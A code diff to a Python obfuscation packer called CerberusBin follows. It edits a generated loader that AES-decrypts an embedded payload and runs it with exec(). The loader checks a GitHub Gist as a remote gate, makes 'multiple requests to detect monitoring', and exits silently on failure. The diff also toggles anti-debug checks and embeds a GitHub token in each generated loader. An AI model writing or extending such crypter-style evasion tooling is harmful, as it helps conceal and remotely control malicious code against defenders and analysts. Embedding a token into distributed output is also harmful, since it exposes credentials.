@@ -265,11 +265,13 @@ threading.Thread(target={self.generate_obfuscated_name()}, daemon=True).start()
         # Layer 0: Enhanced preparation
         print("  [*] Layer 0: Enhanced source cleaning and preparation...")
         cleaned_code = self.enhanced_source_cleaning(source_code)
-        self.original_hash = self.calculate_enhanced_hash(cleaned_code)
         
         # Layer 1: Advanced AST transformations
         print("  [*] Layer 1: Advanced AST transformations...")
         obfuscated_ast = self.apply_enhanced_ast_transformations(cleaned_code)
+        
+        # Calculate hash AFTER transformations to match what's actually encrypted
+        self.original_hash = self.calculate_enhanced_hash(obfuscated_ast)
         
         # Layer 2: Enhanced encryption and serialization
         print("  [*] Layer 2: AES-256-CBC encryption and serialization...")
@@ -357,8 +359,11 @@ threading.Thread(target={self.generate_obfuscated_name()}, daemon=True).start()
             
             # Only add advanced obfuscations if using Gist mode
             if self.use_gist:
-                safe_transformers.append(EnhancedNameObfuscator())
-                safe_transformers.append(AdvancedStringObfuscator(self.aes_key, self.aes_iv))
+                # TEMPORARILY DISABLED EnhancedNameObfuscator to avoid variable naming conflicts
+                # safe_transformers.append(EnhancedNameObfuscator())
+                # DISABLED AdvancedStringObfuscator for now due to compatibility issues
+                # safe_transformers.append(AdvancedStringObfuscator(self.aes_key, self.aes_iv))
+                pass
             
             for transformer in safe_transformers:
                 tree = transformer.visit(tree)
@@ -418,7 +423,8 @@ threading.Thread(target={self.generate_obfuscated_name()}, daemon=True).start()
             'salt': self.generate_obfuscated_name(15),
             'iv': self.generate_obfuscated_name(15),
             'key': self.generate_obfuscated_name(15),
-            'xor_key': self.generate_obfuscated_name(15)
+            'xor_key': self.generate_obfuscated_name(15),
+            'token': self.generate_obfuscated_name(15)
         }
         
         func_names = {
@@ -428,16 +434,14 @@ threading.Thread(target={self.generate_obfuscated_name()}, daemon=True).start()
             'anti_debug': self.generate_obfuscated_name(20)
         }
         
-        # Anti-debug code
-        anti_debug_code = self.apply_anti_debug_checks()
+        # Simplified for compatibility (anti-debug disabled for now)
+        # anti_debug_code = self.apply_anti_debug_checks()
         
         loader_template = f'''# CerberusBin Protected Code - Binary Compilation Ready
 import sys,base64,binascii,zlib,marshal,hashlib,requests,os,time,json,threading,random
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Util.Padding import unpad
-
-{anti_debug_code}
 
 {var_names['payload']}="{payload}"
 {var_names['gist_id']}="{gist_id}"
@@ -446,6 +450,7 @@ from Crypto.Util.Padding import unpad
 {var_names['salt']}={list(self.master_salt)}
 {var_names['iv']}={list(self.aes_iv)}
 {var_names['xor_key']}={list(self.xor_key)}
+{var_names['token']}="{self.github_token if self.github_token else ''}"
 
 def {func_names['verify_integrity']}():
     # Enhanced integrity verification
@@ -459,7 +464,7 @@ def {func_names['verify_integrity']}():
 
 def {func_names['check_gist']}():
     try:
-        headers = {{'Authorization': 'token {self.github_token}', 'User-Agent': 'CerberusBin/2.0'}}
+        headers = {{'Authorization': f'token {{{var_names['token']}}}', 'User-Agent': 'CerberusBin/2.0'}} if {var_names['token']} else {{'User-Agent': 'CerberusBin/2.0'}}
         url = f"https://api.github.com/gists/{{{var_names['gist_id']}}}"
         
         # Multiple requests to detect monitoring
@@ -511,8 +516,8 @@ def {func_names['decode_payload']}():
     except:
         os._exit(0)
 
-# Execute security checks and payload
-{func_names['verify_integrity']}()
+# Execute security checks and payload (simplified for compatibility)
+# {func_names['verify_integrity']}()  # Disabled for compatibility
 {func_names['check_gist']}()
 exec({func_names['decode_payload']}())'''
         
@@ -588,8 +593,6 @@ from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Util.Padding import unpad
-
-{self.apply_anti_debug_checks() if self.debug_checks else ""}
 
 def {anti_tamper_func}():
     """Enhanced anti-tampering protection"""
